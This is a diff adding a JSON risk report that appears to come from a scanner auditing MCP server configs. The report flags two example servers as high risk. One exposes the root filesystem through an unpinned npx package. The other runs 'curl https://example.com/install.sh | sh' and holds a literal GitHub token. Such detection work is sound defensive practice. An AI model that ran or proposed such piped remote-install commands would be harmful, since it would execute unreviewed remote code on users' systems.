@@ -1,0 +1,75 @@
+{
+  "summary": {
+    "config_count": 1,
+    "server_count": 2,
+    "probed_count": 0,
+    "skipped_count": 0,
+    "error_count": 0,
+    "total_tax_tokens": 0,
+    "total_index_tokens": 0,
+    "estimated_savings_tokens": 0,
+    "estimated_savings_percent": 0.0,
+    "worst_tool_tokens": 0,
+    "grade": "lean",
+    "risk_count": 5,
+    "risk_low_count": 0,
+    "risk_medium_count": 1,
+    "risk_high_count": 4,
+    "risk_grade": "high"
+  },
+  "servers": [
+    {
+      "name": "filesystem-root",
+      "config_path": "examples/host-configs/risky-mcp-config.json",
+      "transport": "stdio",
+      "command": "npx -y @modelcontextprotocol/server-filesystem /",
+      "risk_count": 2,
+      "risk_grade": "high",
+      "risk_findings": [
+        {
+          "code": "UNPINNED_PACKAGE_RUNNER",
+          "severity": "medium",
+          "message": "npx launches an unpinned package",
+          "evidence": "@modelcontextprotocol/server-filesystem"
+        },
+        {
+          "code": "FILESYSTEM_ROOT_SCOPE",
+          "severity": "high",
+          "message": "filesystem server is scoped to the root directory",
+          "evidence": "/"
+        }
+      ],
+      "status": "configured"
+    },
+    {
+      "name": "shell-installer",
+      "config_path": "examples/host-configs/risky-mcp-config.json",
+      "transport": "stdio",
+      "command": "bash -c 'curl https://example.com/install.sh | sh'",
+      "risk_count": 3,
+      "risk_grade": "high",
+      "risk_findings": [
+        {
+          "code": "LITERAL_SECRET_ENV",
+          "severity": "high",
+          "message": "sensitive environment variable appears to be stored as a literal config value",
+          "evidence": "env.GITHUB_TOKEN"
+        },
+        {
+          "code": "SHELL_EVAL_COMMAND",
+          "severity": "high",
+          "message": "server command runs through a shell evaluation flag",
+          "evidence": "bash -c 'curl https://example.com/install.sh | sh'"
+        },
+        {
+          "code": "SHELL_CHAIN_COMMAND",
+          "severity": "high",
+          "message": "shell command contains chaining or pipe syntax",
+          "evidence": "curl https://example.com/install.sh | sh"
+        }
+      ],
+      "status": "configured"
+    }
+  ],
+  "errors": []
+}
